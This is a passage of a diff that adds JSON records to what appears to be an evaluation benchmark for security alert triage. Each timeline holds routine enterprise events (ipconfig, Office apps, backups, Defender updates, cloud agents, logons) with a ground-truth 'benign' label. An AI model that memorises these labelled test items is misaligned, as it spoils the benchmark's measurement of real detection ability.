+        "timestamp": "2026-11-07T08:00:00+00:00",
+        "original_record": {
+          "ProcessName": "ipconfig.exe",
+          "CommandLine": "ipconfig.exe /all",
+          "User": "it_support",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-34",
+          "user": "it_support"
+        },
+        "extracted_indicators": [
+          "ipconfig.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T08:02:00+00:00",
+        "original_record": {
+          "ProcessName": "ping.exe",
+          "CommandLine": "ping.exe 8.8.8.8 -n 4",
+          "User": "it_support",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-34",
+          "user": "it_support"
+        },
+        "extracted_indicators": [
+          "ping.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "aa98a8ff-2f1a-407e-b63b-613cd66ce26f",
+    "grouping_key": "HOST-WS-35:admin_ops",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B10-ITAdmin-DomainJoinVerify",
+    "total_events": 1,
+    "start_time": "2026-11-07T09:00:00+00:00",
+    "end_time": "2026-11-07T09:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T09:00:00+00:00",
+        "original_record": {
+          "ProcessName": "nltest.exe",
+          "CommandLine": "nltest.exe /dsgetdc:corp.internal",
+          "User": "admin_ops",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-WS-35",
+          "user": "admin_ops"
+        },
+        "extracted_indicators": [
+          "nltest.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "ed84a102-f033-44b9-aecb-2f2dab2f9e6b",
+    "grouping_key": "HOST-BK-01:veeam_service",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B11-Backup-VeeamAgent",
+    "total_events": 1,
+    "start_time": "2026-11-07T10:00:00+00:00",
+    "end_time": "2026-11-07T10:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T10:00:00+00:00",
+        "original_record": {
+          "ProcessName": "VeeamAgent.exe",
+          "CommandLine": "VeeamAgent.exe -backup --volume C:",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-BK-01",
+          "user": "veeam_service"
+        },
+        "extracted_indicators": [
+          "VeeamAgent.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "7b3b8dab-3906-4574-8cdf-2ee03e5c5edc",
+    "grouping_key": "HOST-OFF-01:staff_emma",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B12-Office-OutlookSync",
+    "total_events": 2,
+    "start_time": "2026-11-07T11:00:00+00:00",
+    "end_time": "2026-11-07T11:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T11:00:00+00:00",
+        "original_record": {
+          "ProcessName": "OUTLOOK.EXE",
+          "CommandLine": "OUTLOOK.EXE /recycle",
+          "User": "staff_emma",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-01",
+          "user": "staff_emma"
+        },
+        "extracted_indicators": [
+          "OUTLOOK.EXE"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-07T11:02:00+00:00",
+        "original_record": {
+          "DestinationIp": "52.96.166.146",
+          "DestinationPort": 443,
+          "Domain": "outlook.office365.com",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-01",
+          "user": "staff_emma"
+        },
+        "extracted_indicators": [
+          "outlook.office365.com"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "40fbd7cf-28c5-499a-8f03-4b2544d62b4c",
+    "grouping_key": "HOST-OFF-02:staff_frank",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B13-Office-ExcelCalculation",
+    "total_events": 1,
+    "start_time": "2026-11-07T12:00:00+00:00",
+    "end_time": "2026-11-07T12:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T12:00:00+00:00",
+        "original_record": {
+          "ProcessName": "EXCEL.EXE",
+          "CommandLine": "EXCEL.EXE C:\\Users\\staff_frank\\Documents\\budget_forecast.xlsx",
+          "User": "staff_frank",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-02",
+          "user": "staff_frank"
+        },
+        "extracted_indicators": [
+          "EXCEL.EXE"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "295d4817-13b1-4777-96ad-0d44206e7642",
+    "grouping_key": "HOST-OFF-03:staff_grace",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B14-Office-WordDocEdit",
+    "total_events": 1,
+    "start_time": "2026-11-07T13:00:00+00:00",
+    "end_time": "2026-11-07T13:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T13:00:00+00:00",
+        "original_record": {
+          "ProcessName": "WINWORD.EXE",
+          "CommandLine": "WINWORD.EXE C:\\Users\\staff_grace\\Documents\\client_brief.docx",
+          "User": "staff_grace",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-03",
+          "user": "staff_grace"
+        },
+        "extracted_indicators": [
+          "WINWORD.EXE"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "0e29b4c3-67a9-459e-b13a-eeb27a83dfff",
+    "grouping_key": "HOST-OFF-04:staff_henry",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B15-Office-TeamsConference",
+    "total_events": 2,
+    "start_time": "2026-11-07T14:00:00+00:00",
+    "end_time": "2026-11-07T14:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T14:00:00+00:00",
+        "original_record": {
+          "ProcessName": "Teams.exe",
+          "CommandLine": "Teams.exe --process-start-args",
+          "User": "staff_henry",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-04",
+          "user": "staff_henry"
+        },
+        "extracted_indicators": [
+          "Teams.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-07T14:02:00+00:00",
+        "original_record": {
+          "DestinationIp": "52.114.132.84",
+          "DestinationPort": 3478,
+          "Protocol": "udp",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-04",
+          "user": "staff_henry"
+        },
+        "extracted_indicators": [
+          "Teams.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "bdaa13e7-969d-4366-bb07-699dab7a340b",
+    "grouping_key": "HOST-OFF-05:staff_isabel",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B16-Office-AcrobatReader",
+    "total_events": 1,
+    "start_time": "2026-11-07T15:00:00+00:00",
+    "end_time": "2026-11-07T15:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T15:00:00+00:00",
+        "original_record": {
+          "ProcessName": "AcroRd32.exe",
+          "CommandLine": "AcroRd32.exe C:\\Users\\staff_isabel\\Downloads\\handbook.pdf",
+          "User": "staff_isabel",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-05",
+          "user": "staff_isabel"
+        },
+        "extracted_indicators": [
+          "AcroRd32.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "855ba0ac-7297-4dee-883e-4c6d35e7a2b8",
+    "grouping_key": "HOST-OFF-06:staff_jack",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B17-Browser-ChromeBrowsing",
+    "total_events": 2,
+    "start_time": "2026-11-07T16:00:00+00:00",
+    "end_time": "2026-11-07T16:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T16:00:00+00:00",
+        "original_record": {
+          "ProcessName": "chrome.exe",
+          "CommandLine": "chrome.exe https://www.wikipedia.org",
+          "User": "staff_jack",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-06",
+          "user": "staff_jack"
+        },
+        "extracted_indicators": [
+          "chrome.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkDNS",
+        "timestamp": "2026-11-07T16:02:00+00:00",
+        "original_record": {
+          "Query": "www.wikipedia.org",
+          "RecordType": "A",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-06",
+          "user": "staff_jack"
+        },
+        "extracted_indicators": [
+          "www.wikipedia.org"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "1719dab4-c26f-4d3e-a764-18f24396df26",
+    "grouping_key": "HOST-OFF-07:staff_kate",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B18-Browser-EdgeUpdate",
+    "total_events": 1,
+    "start_time": "2026-11-07T17:00:00+00:00",
+    "end_time": "2026-11-07T17:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T17:00:00+00:00",
+        "original_record": {
+          "ProcessName": "MicrosoftEdgeUpdate.exe",
+          "CommandLine": "MicrosoftEdgeUpdate.exe /c",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-07",
+          "user": "staff_kate"
+        },
+        "extracted_indicators": [
+          "MicrosoftEdgeUpdate.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "716b08e8-7675-48a5-9f09-5038b095c81b",
+    "grouping_key": "HOST-OFF-08:staff_leo",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B19-Browser-FirefoxSession",
+    "total_events": 1,
+    "start_time": "2026-11-07T18:00:00+00:00",
+    "end_time": "2026-11-07T18:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T18:00:00+00:00",
+        "original_record": {
+          "ProcessName": "firefox.exe",
+          "CommandLine": "firefox.exe",
+          "User": "staff_leo",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-OFF-08",
+          "user": "staff_leo"
+        },
+        "extracted_indicators": [
+          "firefox.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "0edec697-3f94-43dc-9ea3-ff538b4b15ec",
+    "grouping_key": "HOST-SYS-01:time_service",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B20-System-TimeSync",
+    "total_events": 1,
+    "start_time": "2026-11-07T19:00:00+00:00",
+    "end_time": "2026-11-07T19:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T19:00:00+00:00",
+        "original_record": {
+          "ProcessName": "w32tm.exe",
+          "CommandLine": "w32tm.exe /resync",
+          "User": "LOCAL SERVICE",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-01",
+          "user": "time_service"
+        },
+        "extracted_indicators": [
+          "w32tm.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "27ec0c95-4a20-418f-bf22-c4297fdb9b21",
+    "grouping_key": "HOST-SYS-02:admin_ops",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B21-System-GroupPolicyRefresh",
+    "total_events": 1,
+    "start_time": "2026-11-07T20:00:00+00:00",
+    "end_time": "2026-11-07T20:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T20:00:00+00:00",
+        "original_record": {
+          "ProcessName": "gpupdate.exe",
+          "CommandLine": "gpupdate.exe /target:computer /force",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-02",
+          "user": "admin_ops"
+        },
+        "extracted_indicators": [
+          "gpupdate.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "ff869205-d664-472f-b823-1a782536fa62",
+    "grouping_key": "HOST-SYS-03:defender_svc",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B22-System-DefenderSignatures",
+    "total_events": 1,
+    "start_time": "2026-11-07T21:00:00+00:00",
+    "end_time": "2026-11-07T21:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-07T21:00:00+00:00",
+        "original_record": {
+          "ProcessName": "MpCmdRun.exe",
+          "CommandLine": "MpCmdRun.exe -SignatureUpdate",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-03",
+          "user": "defender_svc"
+        },
+        "extracted_indicators": [
+          "MpCmdRun.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "e091949e-4c02-4a65-aa1d-dec7d09cb3a2",
+    "grouping_key": "HOST-SYS-04:alice_smith",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B23-System-LogonSession",
+    "total_events": 1,
+    "start_time": "2026-11-07T22:00:00+00:00",
+    "end_time": "2026-11-07T22:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "SecurityAuth",
+        "timestamp": "2026-11-07T22:00:00+00:00",
+        "original_record": {
+          "EventID": 4624,
+          "LogonType": 2,
+          "TargetUserName": "alice_smith",
+          "IpAddress": "127.0.0.1",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-04",
+          "user": "alice_smith"
+        },
+        "extracted_indicators": [
+          "alice_smith"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "67416a68-267a-4535-b6d6-7fef1cbafa2c",
+    "grouping_key": "HOST-SYS-05:bob_jones",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B24-System-WorkstationLock",
+    "total_events": 1,
+    "start_time": "2026-11-07T23:00:00+00:00",
+    "end_time": "2026-11-07T23:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "SecurityAuth",
+        "timestamp": "2026-11-07T23:00:00+00:00",
+        "original_record": {
+          "EventID": 4800,
+          "TargetUserName": "bob_jones",
+          "Action": "Workstation Locked",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-05",
+          "user": "bob_jones"
+        },
+        "extracted_indicators": [
+          "bob_jones"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "3c705b5d-654a-4345-a086-820fa5ea7b9c",
+    "grouping_key": "HOST-SYS-06:font_svc",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B25-System-FontCacheMaintenance",
+    "total_events": 1,
+    "start_time": "2026-11-08T00:00:00+00:00",
+    "end_time": "2026-11-08T00:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T00:00:00+00:00",
+        "original_record": {
+          "ProcessName": "FntCache.exe",
+          "CommandLine": "FntCache.exe",
+          "User": "LOCAL SERVICE",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-06",
+          "user": "font_svc"
+        },
+        "extracted_indicators": [
+          "FntCache.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "878c8952-e650-41bb-909a-ebc59920b252",
+    "grouping_key": "HOST-SYS-07:defrag_svc",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B26-System-DefragSchedule",
+    "total_events": 1,
+    "start_time": "2026-11-08T01:00:00+00:00",
+    "end_time": "2026-11-08T01:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T01:00:00+00:00",
+        "original_record": {
+          "ProcessName": "defrag.exe",
+          "CommandLine": "defrag.exe C: /U /V",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-SYS-07",
+          "user": "defrag_svc"
+        },
+        "extracted_indicators": [
+          "defrag.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "374cea35-04be-4869-b2a7-28becf40ff5b",
+    "grouping_key": "HOST-CLOUD-01:ssm_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B27-Cloud-AWS-SSMAgent",
+    "total_events": 2,
+    "start_time": "2026-11-08T02:00:00+00:00",
+    "end_time": "2026-11-08T02:02:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T02:00:00+00:00",
+        "original_record": {
+          "ProcessName": "amazon-ssm-agent.exe",
+          "CommandLine": "amazon-ssm-agent.exe",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-CLOUD-01",
+          "user": "ssm_user"
+        },
+        "extracted_indicators": [
+          "amazon-ssm-agent.exe"
+        ],
+        "ground_truth_label": "benign"
+      },
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-08T02:02:00+00:00",
+        "original_record": {
+          "DestinationIp": "52.216.100.5",
+          "DestinationPort": 443,
+          "Domain": "ssm.us-east-1.amazonaws.com",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-CLOUD-01",
+          "user": "ssm_user"
+        },
+        "extracted_indicators": [
+          "ssm.us-east-1.amazonaws.com"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "d5642d22-40d3-4649-a249-1c1906518c87",
+    "grouping_key": "HOST-CLOUD-02:wa_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B28-Cloud-AzureWAAgent",
+    "total_events": 1,
+    "start_time": "2026-11-08T03:00:00+00:00",
+    "end_time": "2026-11-08T03:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T03:00:00+00:00",
+        "original_record": {
+          "ProcessName": "WaAppAgent.exe",
+          "CommandLine": "WaAppAgent.exe",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-CLOUD-02",
+          "user": "wa_user"
+        },
+        "extracted_indicators": [
+          "WaAppAgent.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "c4e91931-72e2-4ca2-9bee-8c092d69740b",
+    "grouping_key": "HOST-CLOUD-03:gupdate_svc",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B29-Cloud-GoogleUpdateTask",
+    "total_events": 1,
+    "start_time": "2026-11-08T04:00:00+00:00",
+    "end_time": "2026-11-08T04:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ScheduledTask",
+        "timestamp": "2026-11-08T04:00:00+00:00",
+        "original_record": {
+          "TaskName": "GoogleUpdateTaskMachineUA",
+          "Action": "check_update",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-CLOUD-03",
+          "user": "gupdate_svc"
+        },
+        "extracted_indicators": [
+          "GoogleUpdateTaskMachineUA"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "ae1e66ae-f42d-4272-9c0f-78bd6e0dbe17",
+    "grouping_key": "HOST-MON-01:dd_agent",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B30-Monitoring-DatadogAgent",
+    "total_events": 1,
+    "start_time": "2026-11-08T05:00:00+00:00",
+    "end_time": "2026-11-08T05:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T05:00:00+00:00",
+        "original_record": {
+          "ProcessName": "agent.exe",
+          "CommandLine": "agent.exe -config C:\\ProgramData\\Datadog\\datadog.yaml",
+          "User": "SYSTEM",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-MON-01",
+          "user": "dd_agent"
+        },
+        "extracted_indicators": [
+          "agent.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "7cb832c0-1453-4bba-8947-6313aaa5496a",
+    "grouping_key": "HOST-MON-02:prom_node",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B31-Monitoring-PrometheusScrape",
+    "total_events": 1,
+    "start_time": "2026-11-08T06:00:00+00:00",
+    "end_time": "2026-11-08T06:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-08T06:00:00+00:00",
+        "original_record": {
+          "SourceIp": "10.0.0.10",
+          "DestinationPort": 9100,
+          "Action": "HTTP_GET_METRICS",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-MON-02",
+          "user": "prom_node"
+        },
+        "extracted_indicators": [
+          "10.0.0.10"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "6ac01ceb-0a5f-453e-9391-214fbe933f97",
+    "grouping_key": "HOST-NET-01:office_user",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B32-Network-SMBFileShare",
+    "total_events": 1,
+    "start_time": "2026-11-08T07:00:00+00:00",
+    "end_time": "2026-11-08T07:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T07:00:00+00:00",
+        "original_record": {
+          "ProcessName": "explorer.exe",
+          "CommandLine": "explorer.exe \\\\fileserver\\marketing",
+          "User": "office_user",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-NET-01",
+          "user": "office_user"
+        },
+        "extracted_indicators": [
+          "explorer.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "be0c2501-e1c1-413e-960f-9e22906c45c7",
+    "grouping_key": "HOST-NET-02:office_user2",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B33-Network-IntranetLookup",
+    "total_events": 1,
+    "start_time": "2026-11-08T08:00:00+00:00",
+    "end_time": "2026-11-08T08:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkDNS",
+        "timestamp": "2026-11-08T08:00:00+00:00",
+        "original_record": {
+          "Query": "intranet.corp.local",
+          "RecordType": "A",
+          "ResolvedIp": "10.0.2.15",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-NET-02",
+          "user": "office_user2"
+        },
+        "extracted_indicators": [
+          "intranet.corp.local"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "483a2679-5a41-4782-83e7-067ccd38a6b5",
+    "grouping_key": "HOST-HR-01:hr_analyst",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B34-HR-WorkdaySession",
+    "total_events": 1,
+    "start_time": "2026-11-08T09:00:00+00:00",
+    "end_time": "2026-11-08T09:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "NetworkConnect",
+        "timestamp": "2026-11-08T09:00:00+00:00",
+        "original_record": {
+          "DestinationIp": "199.19.214.1",
+          "DestinationPort": 443,
+          "Domain": "workday.corp.com",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-HR-01",
+          "user": "hr_analyst"
+        },
+        "extracted_indicators": [
+          "workday.corp.com"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  },
+  {
+    "timeline_id": "ba0909e0-c710-4b6c-8a33-d9c9f21ad10b",
+    "grouping_key": "HOST-DB-01:app_service",
+    "correlation_type": "confirmed",
+    "correlation_reason": "benign_scenario_B35-Database-RoutineQuery",
+    "total_events": 1,
+    "start_time": "2026-11-08T10:00:00+00:00",
+    "end_time": "2026-11-08T10:00:00+00:00",
+    "ground_truth_label": "benign",
+    "alerts": [
+      {
+        "source_dataset": "EVAL-BENCHMARK-BENIGN",
+        "source_file": "enterprise_baseline.json",
+        "event_type": "ProcessCreate",
+        "timestamp": "2026-11-08T10:00:00+00:00",
+        "original_record": {
+          "ProcessName": "sqlcmd.exe",
+          "CommandLine": "sqlcmd.exe -S localhost -Q \"SELECT count(*) FROM Orders;\"",
+          "User": "app_service",
+          "is_malicious": false,
+          "severity": "INFORMATIONAL",
+          "host": "HOST-DB-01",
+          "user": "app_service"
+        },
+        "extracted_indicators": [
+          "sqlcmd.exe"
+        ],
+        "ground_truth_label": "benign"
+      }
+    ]
+  }
+]
